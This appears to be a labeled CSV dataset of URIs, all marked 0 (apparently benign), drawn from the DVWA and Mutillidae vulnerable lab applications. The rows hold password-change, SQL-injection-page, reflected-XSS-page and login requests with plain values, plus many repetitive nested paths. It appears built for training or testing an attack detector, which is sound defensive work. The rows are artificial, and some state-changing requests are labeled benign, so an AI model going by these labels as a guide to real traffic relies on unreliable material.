URI,label
test.com/sql/vulnerabilities/csrf/?password_new=zhanda&password_conf=zhanda&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=admin142&password_conf=admin142&Change=Change#,0
test.com/sql/vulnerabilities/csrf/?password_new=admin343&password_conf=admin142&Change=Change#,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/34,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/103,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/15,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/18,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/23,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/19,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/26,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/31,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/34,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/15,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/17,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/18,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/100,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/55,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/instructions.php/23,0
test.com/dvwa/vulnerabilities/sqli/?id=1000&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=10&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=100&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=2000&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=200&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=20&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=3000&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=300&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=30&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=3&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=40&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=4&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=400&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=5&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=6&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=7&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=8&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=9&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=11&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=12&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=23&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=24&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=27&Submit=Submit#,0
test.com/mutillidae/index.php?username=admin&password=pass&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&password=pass1&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&password=pass2&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin&password=pass3&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin2&password=pass3&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=admin2&password=pass123&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=alloye&password=mypassword&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=alice&password=castlemyshoe2&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=hilda&password=pass3&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=fifi&password=password45&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=emma&password=emmanuel43&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=kaur&password=1234567&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=finson&password=smith45&login-php-submit-button=Login,0
test.com/mutillidae/index.php?username=little&password=bigoo2&login-php-submit-button=Login,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/18,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/21,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/10,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/23,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/26,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/27,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/19,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/34,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/37,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/112,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/32,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/154,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/54,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/39,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/60,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/162,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/64,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/66,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/68,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/70,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/74,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/setup.php/92,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/14,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/8,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/7,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/9,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/3,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/67,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/43,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/23,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/41,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/50,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/51,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/52,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/3,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/5,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/6,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/30,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/131,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/134,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/42,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/45,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/147,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/48,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/50,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/51,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/56,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/58,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/79,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/76,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/63,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/?page=include.php/91,0
test.com/dvwa/vulnerabilities/xss_r/?name=finsk#,0
test.com/dvwa/vulnerabilities/xss_r/?name=mark#,0
test.com/dvwa/vulnerabilities/xss_r/?name=joe#,0
test.com/dvwa/vulnerabilities/xss_r/?name=john#,0
test.com/dvwa/vulnerabilities/xss_r/?name=wenny#,0
test.com/dvwa/vulnerabilities/xss_r/?name=kaur#,0
test.com/dvwa/vulnerabilities/xss_r/?name=hinnk#,0
test.com/dvwa/vulnerabilities/xss_r/?name=benny#,0
test.com/dvwa/vulnerabilities/xss_r/?name=mike#,0
test.com/dvwa/vulnerabilities/xss_r/?name=assembly#,0
test.com/dvwa/vulnerabilities/xss_r/?name=henry#,0
test.com/dvwa/vulnerabilities/xss_r/?name=mohammed#,0
test.com/dvwa/vulnerabilities/xss_r/?name=ali#,0
test.com/dvwa/vulnerabilities/xss_r/?name=bright#,0
test.com/dvwa/vulnerabilities/xss_r/?name=peter#,0
test.com/dvwa/vulnerabilities/xss_r/?name=lily#,0
test.com/dvwa/vulnerabilities/xss_r/?name=katur#,0
test.com/dvwa/vulnerabilities/xss_r/?name=tophy#,0
test.com/dvwa/vulnerabilities/xss_r/?name=pretty#,0
test.com/dvwa/vulnerabilities/xss_r/?name=antonio#,0
test.com/dvwa/vulnerabilities/xss_r/?name=hernandez#,0
test.com/dvwa/vulnerabilities/xss_r/?name=ali#,0
test.com/dvwa/vulnerabilities/xss_r/?name=Reza#,0
test.com/dvwa/vulnerabilities/xss_r/?name=finance#,0
test.com/dvwa/vulnerabilities/sqli/?id=300&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=220&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=610&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=380&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=670&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=675&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=80&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=67&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=617&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=231&Submit=Submit#,0
test.com/dvwa/vulnerabilities/sqli/?id=77&Submit=Submit#,0
test.com/dvwa/vulnerabilities/brute/?username=paul&password=test&Login=Login#,0
test.com/dvwa/vulnerabilities/brute/?username=paul&password=test&Login=Login#,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/21,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/20,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/19,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/18,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/17,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/16,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/15,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/14,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/13,0
test.com/mutillidae/index.php?page=notes.php,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/10,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/9,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/8,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/7,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/6,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/5,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/4,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/3,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/2,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/1,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/15,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/16,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/17,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/14,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/12,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/13,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/11,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/10,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/9,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/8,0
test.com/dvwa/about.php/vulnerabilities/sqli_blind/vulnerabilities/brute/vulnerabilities/brute/vulnerabilities/exec/vulnerabilities/fi/vulnerabilities/sqli/vulnerabilities/sqli_blind/vulnerabilities/upload/vulnerabilities/xss_s/7,0
